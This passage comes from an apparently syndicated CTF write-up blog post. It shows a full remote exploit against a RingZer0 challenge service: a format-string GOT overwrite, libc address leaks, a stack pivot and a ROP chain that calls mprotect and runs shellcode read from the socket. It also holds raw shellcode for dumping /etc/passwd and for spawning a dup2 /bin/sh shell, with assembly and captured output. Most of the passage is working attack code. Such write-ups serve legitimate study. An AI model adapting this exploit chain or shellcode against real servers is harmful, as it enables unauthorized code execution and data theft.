</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># grab strlen from the GOT entry</span>
</span><span class='line'><span class="n">strlen_addr</span> <span class="o">=</span> <span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x601b00</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] strlen is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">strlen_addr</span><span class="p">))</span>
</span><span class='line'><span class="n">libc_base</span> <span class="o">=</span> <span class="n">strlen_addr</span> <span class="o">-</span> <span class="mh">0x80c40</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] libc_base is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">STACK_PIVOT</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x082cfe</span>        <span class="c"># add rsp, 0x100; ret</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] stack pivot gadget is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">STACK_PIVOT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to have three addresses on the stack which we can directly address</span>
</span><span class='line'><span class="c"># to use them in the format string vuln </span>
</span><span class='line'><span class="c"># strlen</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601b00</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601b01</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601b02</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># need to write out the last three bytes of the STACK_PIVOT gadget over strlen&#39;s bytes</span>
</span><span class='line'><span class="n">writebytes</span> <span class="o">=</span> <span class="n">STACK_PIVOT</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span>   
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">lastbyte</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="c"># build format string to set three bytes at once</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">lastbyte</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">):</span>
</span><span class='line'>      <span class="n">byte_to_write</span> <span class="o">=</span> <span class="p">(</span><span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="n">lastbyte</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span> 
</span><span class='line'>      <span class="n">byte_to_write</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">+</span> <span class="p">(</span><span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="n">lastbyte</span>
</span><span class='line'>      
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;%{}c&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">byte_to_write</span><span class="p">)</span>
</span><span class='line'>  <span class="n">lastbyte</span> <span class="o">=</span> <span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">writebytes</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;%{}$hhn&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">format_offset</span><span class="o">+</span><span class="mi">636</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] writing {} to strlen&#39;s GOT entry&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">STACK_PIVOT</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] format string payload: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect and send the format string</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># now, strlen&#39;s GOT entry will point to the stack lifting gadget</span>
</span><span class='line'>
</span><span class='line'><span class="c"># let&#39;s prepare the ROP chain</span>
</span><span class='line'><span class="c"># here are the gadgets</span>
</span><span class='line'><span class="n">SYSCALL</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0ad215</span>
</span><span class='line'><span class="n">POP_RAX</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x041dc8</span>
</span><span class='line'><span class="n">POP_RSI</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x021535</span>
</span><span class='line'><span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x02028b</span>
</span><span class='line'><span class="n">POP_RDX</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0a834b</span>
</span><span class='line'>
</span><span class='line'><span class="n">ropchain</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="c"># mprotect 0x400000 to rwx, so we can write AND execute from it</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RAX</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>     <span class="c"># points to ret; effectively, a NOP!</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>                  <span class="c"># syscall mprotect</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>            <span class="c"># start of buffer to mprotect</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>              <span class="c"># length of buffer</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>                   <span class="c"># flags; rwx</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>             <span class="c"># after executing this syscall, 0x400000 should be rwx</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to fetch the socket from memory</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2028a</span><span class="p">)</span> <span class="c"># pop r15; ret</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mh">0x48</span><span class="p">)</span>               <span class="c">#</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x6933f</span><span class="p">)</span> <span class="c"># lea rax, [rbp + r15]; set rax to address that contains socket descriptor</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">31337</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span>             <span class="c"># junk for all the pop r64&#39;s</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xeb938</span><span class="p">)</span> <span class="c"># mov rax, [rax]; grabs value of socket descriptor</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2c10e</span><span class="p">)</span> <span class="c"># xchg eax, edi; edi now contains the socket descriptor</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read in the shellcode from the socket (sockfd in rdi already)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="c"># syscall read</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>            <span class="c"># start of buffer</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>              <span class="c"># size of buffer</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>             <span class="c"># after this syscall, the shellcode should be at 0x400000</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>            <span class="c"># so return to it!</span>
</span><span class='line'>
</span><span class='line'><span class="c"># rdi still contains socket fd!</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'><span class="c"># send our ropchain</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">ropchain</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'><span class="c"># modified read /etc/passwd, original by Mr.Un1k0d3r</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x49\x87\xff\xeb\x3e\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x90\x90\x90\x49\x87\xff\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># handle the incoming connection; in this case, grab the contents of /etc/passwd</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>parameter <span class="m">5</span> points to:  0x7fffb6657fc8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fffb6658f51
</span><span class='line'>scratch contains:  0x72632f656d6f682f
</span><span class='line'>scratch is parameter 1123
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> strlen is at 0x7f7af6e72c40.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc_base is at 0x7f7af6df2000.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> stack pivot gadget is at 0x7f7af6e74cfe.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601b00 to 1123
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601b01 to 1124
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601b02 to 1125
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> writing 0xe74cfe to strlen<span class="err">&#39;</span>s GOT entry
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> format string payload: %254c%1123<span class="nv">$hhn</span>%78c%1124<span class="nv">$hhn</span>%155c%1125<span class="nv">$hhn</span>
</span><span class='line'>
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>Debian-exim:x:101:103::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:102:65534::/var/lib/nfs:/bin/false
</span><span class='line'>sshuser:x:1000:1000:sshuser,,,:/home/sshuser:/bin/bash
</span><span class='line'>mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>crackme:x:1001:1001::/home/crackme:/bin/sh
</span><span class='line'>*** Connection closed by remote host ***
</span></code></pre></td></tr></table></div></figure>


<p>Cool, we have arbitrary code execution on the remote box! But remember, the goal was to get a shell&hellip;</p>

<h2>Shell&rsquo;s up</h2>

<p>The actual shellcode that landed me a shell uses <code>dup2</code> to duplicate stdin from the socket. This will allow us to communicate with the spawned shell. The assembly is quite straightforward. Not optimized, not pretty:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>push rdi
</span><span class='line'>push rdi
</span><span class='line'>push <span class="m">33</span>         <span class="p">;</span> dup2
</span><span class='line'>pop rax         <span class="p">;</span> <span class="nb">set </span>rax to dup2
</span><span class='line'>                <span class="p">;</span> rdi still contains the socket fd
</span><span class='line'>xor esi, esi    <span class="p">;</span> stdin
</span><span class='line'>syscall
</span><span class='line'>pop rdi
</span><span class='line'>inc rsi         <span class="p">;</span> stdout
</span><span class='line'>syscall
</span><span class='line'>pop rdi
</span><span class='line'>inc rsi         <span class="p">;</span> stderr
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>jmp _there
</span><span class='line'>_here:
</span><span class='line'>pop rdi         <span class="p">;</span> points to /bin/sh
</span><span class='line'>xor esi, esi    <span class="p">;</span> <span class="nv">argv</span> <span class="o">=</span> NULL
</span><span class='line'>xor edx, edx    <span class="p">;</span> <span class="nv">argp</span> <span class="o">=</span> NULL
</span><span class='line'>push <span class="m">59</span>         <span class="p">;</span> execve
</span><span class='line'>pop rax
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>push <span class="m">60</span>         <span class="p">;</span> <span class="nb">exit</span>
</span><span class='line'>pop rax
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>_there:
</span><span class='line'>call _here
</span><span class='line'>db <span class="s2">&quot;/bin/sh&quot;</span>, 0
</span></code></pre></td></tr></table></div></figure>


<p>After sticking that shellcode in the exploit, I got a shell!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x57\x57\x6a\x21\x58\x31\xf6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\xeb\x0f\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00</span><span class="s">&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://barrebas.github.io/assets/maximum-overkill-two/01-interactive-shell-on-remote-box.png" alt="" /></p>

<p>You can see that the <code>dup2</code> shellcode is not completely effective; I needed to redirect stdout to stdin to get command output so somehow <code>dup2</code> does not duplicate stdout correctly. But hey, the objective is met! An interactive shell on an otherwise inaccessible server!</p>

<h2>Wrapping up</h2>

<p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>

<p>Until the next #maximumoverkill :]</p>
]]></content>
  </entry>
  
</feed>
